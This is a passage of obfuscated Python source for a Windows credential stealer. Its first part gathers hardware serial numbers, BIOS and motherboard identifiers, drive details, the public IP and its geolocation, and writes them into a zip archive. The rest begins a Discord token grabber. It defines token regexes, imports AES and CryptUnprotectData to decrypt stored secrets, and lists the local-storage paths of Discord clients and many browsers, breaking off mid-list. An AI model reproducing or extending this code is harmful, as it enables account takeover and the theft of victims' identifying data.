        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, GKKNAFVZEBEEYAIOXDEUGDNAJUIXHLFPNBJGMSWVFQLGUMFJGLI, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemProductName")
            CXEOFOXBOLXJAWZKVFPSSTWXWVRHVIVJVJJXRZQDQQTOFIIPOBFQOXSXDNQZCTAVJRYNJPZDSAUUF = str(v4r_value).replace("{", "").replace("}", "")
    except: CXEOFOXBOLXJAWZKVFPSSTWXWVRHVIVJVJJXRZQDQQTOFIIPOBFQOXSXDNQZCTAVJRYNJPZDSAUUF = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, GKKNAFVZEBEEYAIOXDEUGDNAJUIXHLFPNBJGMSWVFQLGUMFJGLI, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemSKU")
            YIQNYTEMVQVKSGNYFPDFBECEHVALEVPGQNYRMBQPRUKOGMSQUAIUBZBYXGPZSFVOMXONYFG = str(v4r_value).replace("{", "").replace("}", "")
    except: YIQNYTEMVQVKSGNYFPDFBECEHVALEVPGQNYRMBQPRUKOGMSQUAIUBZBYXGPZSFVOMXONYFG = None

    def RunPowershell(query):
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', query],
                stderr=subprocess.STDOUT,
                text=True
            ).split('\n')[0].strip()
            return result if result else None
        except:
            return None

    try: XCMEVBXLMQLAXCPQQPNXWYBZJTKOIEVHFHOFXGUKZBOIJZHVNEHFLELPUIMTECOWAJRCTHGVFWQQELB = RunPowershell("(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID")
    except: XCMEVBXLMQLAXCPQQPNXWYBZJTKOIEVHFHOFXGUKZBOIJZHVNEHFLELPUIMTECOWAJRCTHGVFWQQELB = None

    try: NRSDTYVXMIMUFDBLRGSYMOCZYORVUVVNJDTIQZQRANJYLAYABU = RunPowershell("(Get-WmiObject -Class Win32_BIOS).SerialNumber")
    except: NRSDTYVXMIMUFDBLRGSYMOCZYORVUVVNJDTIQZQRANJYLAYABU = None

    try: CLQLRDQLSJOFDUOUQPNZJCJNFCLSMLXDEIMZZJHLTEJTQAFLBGJWJLXVQXGHSPMNZDAMXJH = RunPowershell("(Get-WmiObject -Class Win32_BaseBoard).SerialNumber")
    except: CLQLRDQLSJOFDUOUQPNZJCJNFCLSMLXDEIMZZJHLTEJTQAFLBGJWJLXVQXGHSPMNZDAMXJH = None

    try: VMALGRTXVOJYISESZBVEJNCLLMPCUVKXBRTCBUETFKXFWDUSIWLJKYBKLNENQWHSOBXYBRBU = RunPowershell("(Get-WmiObject -Class Win32_Processor).ProcessorId")
    except: VMALGRTXVOJYISESZBVEJNCLLMPCUVKXBRTCBUETFKXFWDUSIWLJKYBKLNENQWHSOBXYBRBU = None

    try: YFVPRDFIIEPWXSGUOGPLUEHDMDZWDYPQWYDWHLMTRWWHEHEGAXGCEQRNWODWICWWJVMKNWNGFCMYKLYAC = RunPowershell("(Get-WmiObject -Class Win32_BIOS).OEMStringArray")
    except: YFVPRDFIIEPWXSGUOGPLUEHDMDZWDYPQWYDWHLMTRWWHEHEGAXGCEQRNWODWICWWJVMKNWNGFCMYKLYAC = None

    try: VBOAATALNACRJPAGTIOQZIHHIGSXTIJJUERIPYPEOJYVUWBTMXILZKLDQY = RunPowershell("(Get-WmiObject -Class Win32_SystemEnclosure).SMBIOSAssetTag")
    except: VBOAATALNACRJPAGTIOQZIHHIGSXTIJJUERIPYPEOJYVUWBTMXILZKLDQY = None
        
    try:
        USFKHTYIJNWLSKYQONEVTPWBZGANSKPNQSNUXPQVGPNLJFPHLRSPMYMTQQKZAMRADIRWVNHJDWUHJZPCGXIIJQUQQTPSG = []
        BUVVKODBTEFOOBKUXNIRXWMDFNJAWEVGELFQPQAKOENUOCYVCMVUQINLPWFXNNQYWBVONHAFQDPMOKJMHFXZETSRYKGV = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if BUVVKODBTEFOOBKUXNIRXWMDFNJAWEVGELFQPQAKOENUOCYVCMVUQINLPWFXNNQYWBVONHAFQDPMOKJMHFXZETSRYKGV & 1:
                UXOEKXKUXJNMSFGQYYNRZQZROLKDJNGWCFFAVRCFQHZRACMBJLPMDBUSIEN = v4r_letter + ":\\"
                try:
                    QFLUTLHHUJJLXDEELBYXSYBBLUTOPAPQAZFRPDMALHVTOEOXSHJFBEUNGEQNL = ctypes.c_ulonglong(0)
                    SRGRYBZLWQIUVPZLTGNRDSFIQMYKROORRHDSRKUYPKTVIUATGFQKOAUCPFFOPWFRITAWGZNIOCWVJANAAUSNRJWYLTS = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(UXOEKXKUXJNMSFGQYYNRZQZROLKDJNGWCFFAVRCFQHZRACMBJLPMDBUSIEN), None, ctypes.pointer(SRGRYBZLWQIUVPZLTGNRDSFIQMYKROORRHDSRKUYPKTVIUATGFQKOAUCPFFOPWFRITAWGZNIOCWVJANAAUSNRJWYLTS), ctypes.pointer(QFLUTLHHUJJLXDEELBYXSYBBLUTOPAPQAZFRPDMALHVTOEOXSHJFBEUNGEQNL))
                    CBBLBQHWULHRSAXWQJGKVOGWJPUBBEZATYXCEYPLCNVRTSATXRUDMCFOXBUUZJWXMPJKGZCNUZGK = SRGRYBZLWQIUVPZLTGNRDSFIQMYKROORRHDSRKUYPKTVIUATGFQKOAUCPFFOPWFRITAWGZNIOCWVJANAAUSNRJWYLTS.value
                    NMESFXNYCPJWOKJIZCDHVCQCSXIJZGWJCBEVTQGFOZSSFPDRTUCUASWUYSDRLBHUKDKXLFLDS = QFLUTLHHUJJLXDEELBYXSYBBLUTOPAPQAZFRPDMALHVTOEOXSHJFBEUNGEQNL.value
                    ANOZABICYMCFIXQYWQREQIIWFQIBFOOIYNEDSSTPQMBPTGCWJFGAQBEWFCIGJASMNHWNYUJPYSVUIOAXOQBKCSCQXLOOTFZJSZE = CBBLBQHWULHRSAXWQJGKVOGWJPUBBEZATYXCEYPLCNVRTSATXRUDMCFOXBUUZJWXMPJKGZCNUZGK - NMESFXNYCPJWOKJIZCDHVCQCSXIJZGWJCBEVTQGFOZSSFPDRTUCUASWUYSDRLBHUKDKXLFLDS
                    PMTPQAPXVPEYRCOMTSOADSMFCPJSVAIITFZLUVASQWSMFATTPPUCSWRHCBAOCDKFXRRWCNNNJUWBCWKCQFUFPGLDIGPXXQGGORM = win32api.GetVolumeInformation(UXOEKXKUXJNMSFGQYYNRZQZROLKDJNGWCFFAVRCFQHZRACMBJLPMDBUSIEN)[0]
                    drive = {
                        'drive': UXOEKXKUXJNMSFGQYYNRZQZROLKDJNGWCFFAVRCFQHZRACMBJLPMDBUSIEN,
                        'total': CBBLBQHWULHRSAXWQJGKVOGWJPUBBEZATYXCEYPLCNVRTSATXRUDMCFOXBUUZJWXMPJKGZCNUZGK,
                        'free': NMESFXNYCPJWOKJIZCDHVCQCSXIJZGWJCBEVTQGFOZSSFPDRTUCUASWUYSDRLBHUKDKXLFLDS,
                        'used': ANOZABICYMCFIXQYWQREQIIWFQIBFOOIYNEDSSTPQMBPTGCWJFGAQBEWFCIGJASMNHWNYUJPYSVUIOAXOQBKCSCQXLOOTFZJSZE,
                        'name': PMTPQAPXVPEYRCOMTSOADSMFCPJSVAIITFZLUVASQWSMFATTPPUCSWRHCBAOCDKFXRRWCNNNJUWBCWKCQFUFPGLDIGPXXQGGORM,
                    }
                    USFKHTYIJNWLSKYQONEVTPWBZGANSKPNQSNUXPQVGPNLJFPHLRSPMYMTQQKZAMRADIRWVNHJDWUHJZPCGXIIJQUQQTPSG.append(drive)
                except:
                    ()
            BUVVKODBTEFOOBKUXNIRXWMDFNJAWEVGELFQPQAKOENUOCYVCMVUQINLPWFXNNQYWBVONHAFQDPMOKJMHFXZETSRYKGV >>= 1

        KFTYRYZKUCMWJUFCIJGWLYWEWTCESCLKDZIEUSMHFNIERPXEADNGSEKRXUXORTASORWVRGLSZTA = "   {:<7} {:<10} {:<10} {:<10} {:<20}".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in USFKHTYIJNWLSKYQONEVTPWBZGANSKPNQSNUXPQVGPNLJFPHLRSPMYMTQQKZAMRADIRWVNHJDWUHJZPCGXIIJQUQQTPSG:
            EDKWUJNCDBTVBUYTTUWJWKKDORDDZTGERVFYOLPQPDOUEBAAFIMOZAIAWWEAEJKEWSPERCUVZQQMOCDBZMGXXDGXA = (v4r_drive['used'] / v4r_drive['total']) * 100
            NMESFXNYCPJWOKJIZCDHVCQCSXIJZGWJCBEVTQGFOZSSFPDRTUCUASWUYSDRLBHUKDKXLFLDS_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            CBBLBQHWULHRSAXWQJGKVOGWJPUBBEZATYXCEYPLCNVRTSATXRUDMCFOXBUUZJWXMPJKGZCNUZGK_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            EDKWUJNCDBTVBUYTTUWJWKKDORDDZTGERVFYOLPQPDOUEBAAFIMOZAIAWWEAEJKEWSPERCUVZQQMOCDBZMGXXDGXA_str = "{:.2f}%".format(EDKWUJNCDBTVBUYTTUWJWKKDORDDZTGERVFYOLPQPDOUEBAAFIMOZAIAWWEAEJKEWSPERCUVZQQMOCDBZMGXXDGXA)
            KFTYRYZKUCMWJUFCIJGWLYWEWTCESCLKDZIEUSMHFNIERPXEADNGSEKRXUXORTASORWVRGLSZTA += "\n - {:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   NMESFXNYCPJWOKJIZCDHVCQCSXIJZGWJCBEVTQGFOZSSFPDRTUCUASWUYSDRLBHUKDKXLFLDS_gb,
                                                                   CBBLBQHWULHRSAXWQJGKVOGWJPUBBEZATYXCEYPLCNVRTSATXRUDMCFOXBUUZJWXMPJKGZCNUZGK_gb,
                                                                   EDKWUJNCDBTVBUYTTUWJWKKDORDDZTGERVFYOLPQPDOUEBAAFIMOZAIAWWEAEJKEWSPERCUVZQQMOCDBZMGXXDGXA_str,
                                                                   v4r_drive['name'])
    except:
        KFTYRYZKUCMWJUFCIJGWLYWEWTCESCLKDZIEUSMHFNIERPXEADNGSEKRXUXORTASORWVRGLSZTA = """   Drive:  Free:      Total:     Use:       Name:       
   None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            BBETEDSJQKHPXRAZVKWQFXSAIMHOPBPVPXDBLMWXXYJHDVYLQJGH = 'Pc Portable'
        else:
            BBETEDSJQKHPXRAZVKWQFXSAIMHOPBPVPXDBLMWXXYJHDVYLQJGH = 'Pc Fixed'
    except:
        BBETEDSJQKHPXRAZVKWQFXSAIMHOPBPVPXDBLMWXXYJHDVYLQJGH = "None"

    try: WWFIIITNUJETOUJHBCSPHALTTHGOODQXECNWPGTWCNQVPYZBQRCVALEQ = len(screeninfo.get_monitors())
    except: WWFIIITNUJETOUJHBCSPHALTTHGOODQXECNWPGTWCNQVPYZBQRCVALEQ = "None"

    FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_system_info = "Yes"
    NSOYSDAVLRXYNAEWVBDGSKJPTOIJFRYOHEKRNEGTGWJERKTGUFUZJLCXDXQWVKKEREMZKDHVGVPJJHOCLAETDN = f"""
User Pc:
 - Hostname    : {OBFZEWJWHIXJSRVUIVVHWOOBFRNETBPXHWOVKCAGLOHMPXNSQJNRYWQZZWXRXTDXTWIOGMQIMWAKOQIHUCPGWMNROXX}
 - Username    : {CAYZQTAYKWJCOCEVLLWWIHEGJRZOBUOYTUFFFPOKOEXZTQFVBSRWIFZCHGUNMSAMIELMFKHI}
 - DisplayName : {SNIMDDFAARRXYCWVXBLSCMMGQXZBCUWDWUKRLEDVGSECJRJLXNWCJMBYHYW}

System:
 - Plateform     : {BBETEDSJQKHPXRAZVKWQFXSAIMHOPBPVPXDBLMWXXYJHDVYLQJGH}
 - Exploitation  : {MXIRPIXBYVRMKVQXHAUEAYZRVIAVGFSZZYPRJBYJKORFLUUPNFHQFCEGFZLWYASSMPRLPLOEMYOSMPOMOYL} {MADKDVLVWDJMBDIMBHXMHFWOFLATBDGEGUQGBCYNVAIFKXZHZASOWNOWOHKUCMPYBQICJUJBIPKTUKIFOTP}
 - Screen Number : {WWFIIITNUJETOUJHBCSPHALTTHGOODQXECNWPGTWCNQVPYZBQRCVALEQ}

Peripheral:
 - CPU : {NLYWZNNPZOEFKRZGBLDTTNJYIRQKAVMTTOLNPIJVYFZNJAUCPHXX}, {NJMLBZMDQNXWUMBSMTEFLUILQEJPROCWPBSNTLUHAPRJFFVUDEMCUYRAYTASTVMSRQPTIRSJ} 
 - GPU : {LEERNKBLJUHYLOPJFRLWESPZOEVOJMXMULPNTXJHPKAWGDOQOVAULXGZAJPTDSATWMVNGQWJPNPZ}
 - RAM : {FPYSXSRIJBWHEOWSMBEMXDLWQHNDTFKEZMRFYATFROQQLFXXHPDCCNLOSRYRJGAEZRCAXJLUNPKEANTHQCDKIZ}

Disk:
{KFTYRYZKUCMWJUFCIJGWLYWEWTCESCLKDZIEUSMHFNIERPXEADNGSEKRXUXORTASORWVRGLSZTA}

Serial Number:
 - MAC                       : {DYCEIPTZZAKJDISLFFOKKKKFVCGWFVLNHIMXFBYBAYMPXOFZLKEXYSBMKXNGBYLRGVOIKUQFZFZZUY}
 - Machine Id                : {KOFTGXTFHCXKHDBRKYICBUKNUBMYRGLYCGVDPQBSBCZUJXMHRWIYKQVSINQPJLVRYRTKNUASCECFCKVD}
 - Machine Guid              : {JUDWFIGUHQAWSVJYBRGMTOPMHWTRCKGBPOXJRHGAGWDHACYWHIXFERIGCUAWOGVDPJHYMLPJIDI}
 - Hw Profile Guid           : {WKHRZHVPAMUXHDFBKFDHUIUTYVEARMDHGFDCKROSJMNOFQHMBJYIDKGQSFDZXWETYZPEKRYWH}
 - Nvidia System Id          : {JGRYWBJGNMCKJQKGTEATADPRKDOZPESFFLPQAKKCJYHPNLSBRLYTSKNBQIDSVALTUDHSMLQZMGGVOSWDC}
 - Guid Serial Number        : {PZEISHNRSYEZNFHEYYIXWQAOAFKEMVQFZAPBGDDALBXHVNRFIQRGOXXTKCZTTCNFXFGQOKYVPFMXYPCPBLNPNYILZICTPKGK}
 - Uuid Serial Number        : {XCMEVBXLMQLAXCPQQPNXWYBZJTKOIEVHFHOFXGUKZBOIJZHVNEHFLELPUIMTECOWAJRCTHGVFWQQELB}
 - Motherboard Serial Number : {CLQLRDQLSJOFDUOUQPNZJCJNFCLSMLXDEIMZZJHLTEJTQAFLBGJWJLXVQXGHSPMNZDAMXJH}
 - Motherboard Product       : {OSKBLIJAWDBXSFGHUKWZTKGUTGTUFWQEFINJNVMSBRGYLFKLVHPQNBZIPAHTOJFNVLHXMHOHCZURTIEWN}
 - Motherboard Manufacturer  : {MPFPKSYZRJOHYMJIPAUWTHZPKWUGVGVKKIVMVMROORETKCWHMUUYNSRKAVYSIZLFTIPSYEHSMLXRCPICRHTMJLXBBNCAMXIF}
 - Processor Serial Number   : {VMALGRTXVOJYISESZBVEJNCLLMPCUVKXBRTCBUETFKXFWDUSIWLJKYBKLNENQWHSOBXYBRBU}
 - Bios Serial Number        : {NRSDTYVXMIMUFDBLRGSYMOCZYORVUVVNJDTIQZQRANJYLAYABU}
 - Bios Release Date         : {MFGBKSHMDKOJKLLVIVWRPJDFPAZMGPCZEZHPARTTWNVRORZLKAYPKEPDPYNMNOKKUDCBPYIZAQLTAFHVAOBREGICFIDZLUA}
 - Bios Version              : {SPFSPXTPLGEFMXYLFROEGECTNQMPKDSDVQEWVXYAQQMNUPMYDJTNFSHOOTXQUNRHATLHHXKOZPROFJIPHTHVLA}
 - System Bios Version       : {EPXKOGEDFXRIBBHKXYVVMEKBLIDTHTYBJYZESXPDPIQPYDGKCPVBBLROUZFQMTOSFNAKGZVGGHIOPHFOMHCAJCTTCSHXOKUZU}
 - System Version            : {LWMQVNURTMMUBFQSYKUGUPIUIXFMVTJGHGWZNJEMWCHQODZFIYTEQBFWUWXORNGEUMAVYVJNQDGMXKLCHMTYPGJYKTKWAV}
 - System Family             : {MONADDDSLGUUJEIVVVTLHXLBUXFWOLRITKRVPYEQANIGHKQQYNASEABXWZULGVZHVJVMYKGTLLKGQNQGK}
 - System Manufacturer       : {TTXYZNTTHQQCLLIHDCMVXMBQCFCBMMWNXKWDFPWTBOJUBVWPKCVWITZWIJITHHEWGEYZ}
 - System Product            : {CXEOFOXBOLXJAWZKVFPSSTWXWVRHVIVJVJJXRZQDQQTOFIIPOBFQOXSXDNQZCTAVJRYNJPZDSAUUF}
 - System SKU                : {YIQNYTEMVQVKSGNYFPDFBECEHVALEVPGQNYRMBQPRUKOGMSQUAIUBZBYXGPZSFVOMXONYFG}
 - Oem String Serial Number  : {YFVPRDFIIEPWXSGUOGPLUEHDMDZWDYPQWYDWHLMTRWWHEHEGAXGCEQRNWODWICWWJVMKNWNGFCMYKLYAC}
 - Asset Tag Serial Number   : {VBOAATALNACRJPAGTIOQZIHHIGSXTIJJUERIPYPEOJYVUWBTMXILZKLDQY}

Ip:
 - Public : {HOYOUCWQGHITKOIBXOPAFBIZOTICFURVECQEFJMENZDKEZRBVLCOCKGKUPOVFLDXKCXRVNRUOZSDZGNLEQNSRZZRDTFDIFTHL}
 - Local  : {QEHZJJFZALHSGYQHDNUNFSQMCDUAWFPVOOMSTPFZGJURFVNLXRTUD}

Ip Information:
 - Isp : {WTQUKKKDWPWSVWUFJSDRFTAIIZECRDRGTEBAJSXWMXKZYYSXQUWXTIODGHODBMNVKXLNNMDETOEMICMNZRQP}
 - Org : {ECHCOWGFAOCRCPZIQSWOAUBXRCODSYFYSXIZTPDMDMQGXYKYTQTTSACIXUVCKIVXJHADLDWHPCLMSUYZAUEUFNRA}
 - As  : {FZGAVZSQIRVVRHCMPOTNUTPYIYPTEPHVDBKBXOHRFHOXWVOGTLYBKITRHPCMUUKUMJIXCXWXS}

Ip Location:
 - Country   : {HUVSFNVRXHWIZEWBIVNHLCJAHDVKLXJGDFMXQWKVZXPWURWKUXRKWDLZNAKKMPECYVQZRVQQV} ({HUVSFNVRXHWIZEWBIVNHLCJAHDVKLXJGDFMXQWKVZXPWURWKUXRKWDLZNAKKMPECYVQZRVQQV_code})
 - Region    : {MFIXSSUIDGLWAHGIMMFYTPUNJRLDWBJXHCJVWCCKBWSLZMPZGUPDQYGPOCIZBIUEFDFXDBPCSWJVOUOMFKFHJBTOQJZSL} ({MFIXSSUIDGLWAHGIMMFYTPUNJRLDWBJXHCJVWCCKBWSLZMPZGUPDQYGPOCIZBIUEFDFXDBPCSWJVOUOMFKFHJBTOQJZSL_code})
 - Zip       : {YNKTNQEWSDVDWEOYXJBHOGGGCHVBNBQCMDQQYKKQDUGMQCZLWVJKLQLNZRUOMKNDSMUJYBMQYQOCCSEHHTUISLGDOKAGIBDWRIUE}
 - City      : {DJMRWGCXADNFQAPLGRSKHMKEIAAZZPMNKFZXTFKDHCOGHJOKQJTDIIVANOS}
 - Timezone  : {FSBWRNBXKUZSZZFSJANHAEFDEVOWFBFQZUPLULKICEAZMAUTVDBUFQXYHW}
 - Longitude : {IWBWNACUJKILNUMGTOCGAUSFUWGKQHTYCFZBARQKEBFJLEQULDFQHRUOZKOQHWAKOSWZIIJOWNMNTKGFBCGDJLDDZFBCUQVJB}
 - Latitude  : {ZXXGMFOQXJAAAEOWAWLQJFWQJLISIDRMLQUMYTJGOMORYGMQLJGKVPTYVFQIAWYAAPAIZKDOFDY}
"""
    BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.writestr("System Info.txt", NSOYSDAVLRXYNAEWVBDGSKJPTOIJFRYOHEKRNEGTGWJERKTGUFUZJLCXDXQWVKKEREMZKDHVGVPJJHOCLAETDN)

    return FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_system_info

def EQUQRNFLAFTUTUUVIGGOHPQWEUGCADGLFJRKYKOYWUUUYYJHRAORKNOHVFDOXQBHURMAEJPXNQAQUZTYSASLQOGVL(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    import os
    import re
    import json
    import base64
    import requests
    import psutil
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData

    HSWJCCJQASWMWJJBZWZGDIGUKFGRZNVJWOGJDDZXCCZIOTMOWLJRLPSWMSJBTSWYR = ""
    MVORSKFSYNELBCHBUUYXVSDOHYZQWXZSJPJGKWJDALFVXLLSIQLUDGLOPLLYJVIUWBDFZLJTOJKLLQZSTAJZTRZQHIQV = 0

    def KQAWBNQSJZYFLMVUQFEXJTKGFKFEQIIFFCZYIIFBPJYHFJOAKBTCDMOBGMBXSPKNVQAFYVXYKAYHWMPJNPUDKVORSHVNVGDHAYJ():  
        RAUYUBHRJIBHPAMHLBMOFAXESKEMNEKCCNFXXDSHOKKHIGZMMCJFVIQSPSZHCOAPPWJAWJGACORLVTFCOVA = "https://discord.com/api/v9/users/@me"
        ZCOMINUWUAGLJTWQDEYEPMQSVDSOKHLRANCVCWWKQQFAVKKJNMVWBZMOITRVOWBHLTAUGUBUZUNUBUZOUMMRAXBORISRRF = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        ZCOMINUWUAGLJTWQDEYEPMQSVDSOKHLRANCVCWWKQQFAVKKJNMVWBZMOITRVOWBHLTAUGUBUZUNUBUZOUMMRAXBORISRRF_enc = r"dQw4w9WgXcQ:[^\"]*"
        EYPUYWQPOYNPBWWEOAXAKPJULNHJDASGPYYYDMEWUMZAPXLDVOUHKXJZUIBKHOJDUWLSOETFS = []
        FTAUPFDBMDVRGZISBXQNDQMXCLDSJOGBBDBQJAKRSHKRDIVQWTIEQWMADOUJWPA = []
        SNGCZZSMXIWXSIUAXBYLXPTZABAPZDBUGTLEUBTIYNOGETYGOTDAEEXWCDPLCDOYPGVTHHLSPWOUVJCOCUOLITF = {}

        SDDVXOCEFSWMPSRHHPKPPFKRIHNYXJCELDXMDCKGUZYYLQVLSFBMMCPLQVSIZPCZRBGYGYPUZSJPIJJQ = [
            ("Discord",                os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "discord", "Local Storage", "leveldb"),                                                  ""),
            ("Discord Canary",         os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "discordcanary", "Local Storage", "leveldb"),                                            ""),
            ("Lightcord",              os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Lightcord", "Local Storage", "leveldb"),                                                ""),
            ("Discord PTB",            os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "discordptb", "Local Storage", "leveldb"),                                               ""),
            ("Opera",                  os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
            ("Opera GX",               os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
            ("Opera Neon",             os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
            ("Amigo",                  os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
            ("Torch",                  os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
            ("Kometa",                 os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
            ("Orbitum",                os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
            ("CentBrowser",            os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
            ("7Star",                  os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
            ("Sputnik",                os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
            ("Vivaldi",                os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
            ("Google Chrome",          os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
            ("Google Chrome",          os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
